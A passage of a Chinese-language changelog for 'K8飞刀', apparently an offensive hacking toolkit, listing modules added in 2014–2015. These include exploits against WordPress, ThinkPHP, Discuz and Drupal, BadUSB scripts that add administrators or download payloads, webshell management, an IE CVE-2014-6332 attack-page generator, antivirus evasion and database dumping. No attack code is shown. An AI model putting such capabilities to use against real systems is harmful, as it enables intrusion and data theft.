点号) 互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>=================================================================================<br>K8飞刀 20150425 WP漏洞专版<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress photo-uploader 1.8&nbsp;&nbsp;&nbsp;&nbsp; PHP文件上传漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Simple Ads Manager 2.5.96&nbsp; SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Business Intelligence&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Security &amp; Firewall 3.9 SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Ajax Store Locator 1.2&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress sp-client-document-manager SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Tune Library 1.5.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress MiwoFTP &lt;= 1.0.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件下载漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress NEX-Forms 3.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Magento Server MAGMI&nbsp; 插件本地包含漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;= 2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;=3.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞利用EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress Mobile Edition 2.7 文件读取EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150422<br>K8飞刀 20150418<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.2.2 (TinyMCE) SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.1.2 Remote Code Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.4.1 LFI 0day Exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>=================================================================================<br>K8飞刀 20150412 BadUSB专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 过UAC执行任意脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义BAT脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义VBS脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 添加管理员开启3389&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本(VBS转BAT脚本 VBS转CMD命令渗透常用)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 开启Telnet脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win-EN DNS修改脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 添加管理员脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150409<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy(Win&amp;Lnx)下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Linux&nbsp;&nbsp; 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Hacked by&nbsp; 装B脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150324<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Arduino 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150320<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 帝国备份王万能Cookie登陆后台Exp(需修改时间戳)&nbsp;&nbsp;&nbsp;&nbsp; 20150319<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ecshop管理员md5转成Cookie 可直接进入2.7.x后台&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz产品 SupeSite 6.x 7.x 全版本SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! 7.2 faq.php注入爆表前缀EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vBulletin 3 &amp; 4 ajax.php SQL注入爆管理Exploit&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP URL安全漏洞SQL注入爆管理员EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]GoogleHack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增GoogleHack模块,提高工作效率&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150127<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150121<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP文件管理(无权限+禁用图标 空目录+灰色图标)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(增加Linux列目录功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(右键增加复制目录结构功能)&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件删除/列目录更新)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键发送到相关模块,相关功能优化&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET和POST提交-流文件保存功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载到服务器功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>=================================================================================<br>K8飞刀 20150114<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码保留Get或Post常用的=号和&amp;符 另附单独转换&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! X系列产品升级/转换漏洞 GetShell Exp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复修改EXP附加URL无法更新的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell表新增Shell类型字段,用于区分各种提交方式&nbsp; 20150112<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(右键增加 复制选中URL 保存扫描结果)&nbsp;&nbsp; 20150109<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件上传功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code代码(去掉代码前序号[格式(序号+空格+代码)])&nbsp;&nbsp;&nbsp; 20150107<br>[+]FixBug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复某些功能网络连接卡死的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150107<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善文件管理功能(密码/Ke/证书类-绿色+Key图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150106<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell在控状态检测(以是否能执行代码为标准)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150105<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(脚本配置文件-蓝色+设置图标&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(常用目录-紫色目录图标显示&nbsp;&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(WebShell类-普通紫色+黑脸图标&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(提权类黑客类-高亮紫色+图标)&nbsp;&nbsp; 20141231<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WebShell图片木马合成不支持空格路径的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141228<br>=================================================================================<br>K8飞刀 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进制转换(10进制\2进制\8进制\16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File2JsHex(文件转成JS16进制 网页内嵌木马常用)&nbsp;&nbsp;&nbsp;&nbsp; 20141219<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell图片木马合成(上传绕过WAF或留包含后门)&nbsp;&nbsp;&nbsp;&nbsp; 20141218<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本随机ASCII加密解密(一秒免杀IE神洞网马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141214<br>=================================================================================<br>K8飞刀 20141208 CSRF专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Post提交代码(Flash/jQuery/Flash/Python/Perl/PHP)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Post参数 与 常规Post参数 互转(方便写EXP)&nbsp;&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flash&nbsp; Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141206<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加WordPress后台主题GetShell代码 + 右键菜单美化&nbsp; 20141203<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加右键复制 Web全部信息 Banner/IP/地址位置信息&nbsp;&nbsp; 20141202<br>=================================================================================<br>K8飞刀 20141130<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 选中URL可右键使用 Firefox\Chrome\IE 浏览器打开&nbsp;&nbsp;&nbsp; 20141128<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 正则截取数据(结果支持同时提取8个参数 灵活度更高)&nbsp; 20141128<br>K8飞刀 20141125 IE神洞版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IE神洞 MS14-065 CVE-2014-6332 网马生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]XSSanalysis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS挂马流量分析系统 未完成.. 静请期待&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP-Chr连接字符串(点号 +号)互转 WebShell常用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141123<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(WebShell\PHP\JSP\ASP\ASPX大量字典)&nbsp;&nbsp; 20141120<br>=================================================================================<br>K8飞刀 20141111 光棍专版<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加Banner/IP/地址位置信息 美化各项配置属性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141110<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复不能读取配置文件长字符串的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141107<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动保存当前脱库配置信息/重起程序后自动加载&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP不显示脱库速度/多线程脱库时不能停止的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注入点脱库(多线程) + 计算脱库速度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141104<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 多行字符串 转成 C# StringBuffer代码 开发用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相对路径生成 Discuz 6.x/7.x代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>=================================================================================<br>K8飞刀 20141101<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码多行转一行 Bat逻辑命令符转成一行与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP/2003 工具栏图标按钮位置调整&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Big5(HK)编码,修复脱库时HK繁体乱码的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键添加发送到DataOutput模块功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加robots.txt查看按钮(大部分网站都会有的)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]ExpDebug/Exploit&nbsp;&nbsp; 禁用掉错误提示脚本&nbsp; 添加Discuz 7.2 相关EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141029<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台PHP-Chr连接字符串 GetShell代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP GetShell代码 PHP-Chr连接字符串生成与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面直观 (工具栏/右键菜单/Tab头)添加相应图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141025<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台 (PHP Filter)模块GetShell 代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持导入20141022版本前数据库(提示新增EXP数量)&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exploit-DB模块 新增自定义 网址 附加URL 参数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hex编码(GB2312\UTF8\Unicode)&nbsp; Hex解码GB2312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141019<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入 Hex文件路径(MSSQL) Hex文件路径(Mysql)&nbsp;&nbsp;&nbsp;&nbsp; 20141018<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面&nbsp; 编辑框只留一个&nbsp; 加密算法全放置右键菜单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drupal 7.31 SQL注入漏洞 EXP (测试 7.12 7.31)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 国庆花一天 弄K8工具当年常用时尚透明皮肤(.Net)&nbsp;&nbsp;&nbsp;&nbsp; 20141005<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加数据库(Oracle MYSQL MSSQL)4种CHAR格式解密&nbsp;&nbsp;&nbsp;&nbsp; 20140925<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所有文本框 右键菜单增加 转大小写 转全半角功能&nbsp;&nbsp;&nbsp;&nbsp; 20140920<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加/修改WebShell 增加高级模式&nbsp; 默认简易模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140908<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Delphi互转其它代码用到&nbsp; 赋值 := 互转 =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 各语言代码常用 转义字符双引号&nbsp; \" 互转 "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]CheckUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检测最否有最新版 提示编译日期并打开URL地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140818<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 脱库模块 SQL注入点脱库 也可用于WebFuzzing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140814<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 执行EXP&nbsp; 提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复浏览器模式提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 Zimbra LFI 0day exploit 本地包含漏洞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140812<br>[+]FileManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellManage右键文件管理模块-PHP列目录完成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 路径常用符号互转 /转\\&nbsp; \\转/&nbsp; /转\&nbsp; 